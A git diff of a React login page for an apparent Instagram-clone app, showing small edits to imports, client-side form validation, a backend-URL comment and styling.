@@ -1,16 +1,15 @@
 import { useState, useEffect } from 'react';
 import axios from 'axios';
-import { Link, useNavigate } from 'react-router-dom';
+import { Link } from 'react-router-dom';
 
 const Login = () => {
   const [emailOrUsername, setEmailOrUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isFormValid, setIsFormValid] = useState(false);
   const [loading, setLoading] = useState(false);
-  const navigate = useNavigate();
 
   useEffect(() => {
-    setIsFormValid(emailOrUsername.length >= 1 && password.length >= 6);
+    setIsFormValid(emailOrUsername.length >= 1 && password.length >= 1);
   }, [emailOrUsername, password]);
 
   const handleLogin = async (e) => {
@@ -18,7 +17,7 @@ const Login = () => {
     if (!isFormValid) return;
     
     setLoading(true);
-    // Use environment variable or default to live backend
+    // Hardcoded live backend URL for guaranteed connection
     const BACKEND_URL = 'https://insta-clone-backend-35i9.onrender.com';
     
     try {
@@ -84,11 +83,11 @@ const Login = () => {
       </div>
 
       <div className="bottom-section">
-        <Link to="/signup" className="create-btn" style={{ textAlign: 'center', textDecoration: 'none', display: 'block' }}>
+        <Link to="/signup" className="create-btn">
           Create new account
         </Link>
         <div className="meta-footer">
-          <svg viewBox="0 0 24 24" className="meta-logo-svg">
+           <svg viewBox="0 0 24 24" className="meta-logo-svg">
             <path d="M16.143 4.5c-2.457 0-4.414 1.83-5.32 3.623C9.917 6.33 7.96 4.5 5.503 4.5 2.463 4.5 0 6.963 0 10.003s2.463 5.503 5.503 5.503c2.457 0 4.414-1.83 5.32-3.623.906 1.793 2.863 3.623 5.32 3.623 3.04 0 5.503-2.463 5.503-5.503S19.183 4.5 16.143 4.5zm0 8.414c-1.61 0-2.911-1.301-2.911-2.911s1.301-2.911 2.911-2.911 2.911 1.301 2.911 2.911-1.301 2.911-2.911 2.911zm-10.64 0c-1.61 0-2.911-1.301-2.911-2.911s1.301-2.911 2.911-2.911 2.911 1.301 2.911 2.911-1.301 2.911-2.911 2.911z" />
           </svg>
           <span className="meta-text">Meta</span>
